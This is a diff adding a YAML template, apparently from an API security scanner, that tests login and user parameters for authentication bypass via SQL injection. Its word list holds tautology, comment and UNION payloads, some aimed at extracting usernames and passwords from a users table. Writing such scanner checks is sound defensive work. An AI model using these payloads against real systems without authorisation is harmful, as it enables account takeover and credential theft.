@@ -1,0 +1,101 @@
+id: SMART_AUTH_BYPASS_SQL_INJECTION
+info:
+  name: Authentication Bypass using SQL Injection - Smart Testing
+  description: Smart testing for authentication bypass through SQL injection vulnerabilities. Detects when authentication queries can be manipulated using SQL injection to gain unauthorized access.
+  details: Tests for SQL injection vulnerabilities in authentication mechanisms by intelligently injecting UNION-based SQL statements into authentication parameters. The system detects both positive (successful data extraction) and negative (WHERE clause manipulation) injection attempts across different parameter types.
+  impact: Unauthorized access to user accounts, data breaches, compromise of sensitive authentication information, and potential full system compromise.
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: SMART_AUTH_BYPASS_SQL_INJECTION
+  severity: MEDIUM
+  agenticTestingAllowed: true
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/
+    - https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md
+  cwe:
+    - CWE-287
+    - CWE-89
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Unauthorized
+      - access denied
+      - Forbidden
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$|password|^pass$|^pwd$"
+            extract: authKey
+          value:
+            extract: authVal
+    - query_param:
+        for_one:
+          key:
+            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$|password|^pass$|^pwd$"
+            extract: authKey
+          value:
+            extract: authVal
+
+wordLists:
+  sqlInjectionPayloads:
+    - "' UNION SELECT null, null--"
+    - "' UNION SELECT null, null, null--"
+    - "' UNION SELECT null, null, null, null--"
+    - "' UNION SELECT 1, 'admin', 'password' FROM users--"
+    - "' UNION SELECT null, username, password FROM users--"
+    - "' UNION ALL SELECT null, null, null--"
+    - "' UNION ALL SELECT 1, 'admin', 'password'--"
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "admin'--"
+    - "' UNION SELECT null, null WHERE 1=0--"
+    - "' UNION SELECT null, null, null WHERE 1=0--"
+    - "' UNION SELECT 1, 'admin', 'password' FROM users WHERE 1=0--"
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            authKey: ${authVal}${sqlInjectionPayloads}
+        - modify_query_param:
+            authKey: ${authVal}${sqlInjectionPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Unauthorized
+                - access denied
+                - Forbidden
+        - success: x1
+        - failure: continue
+
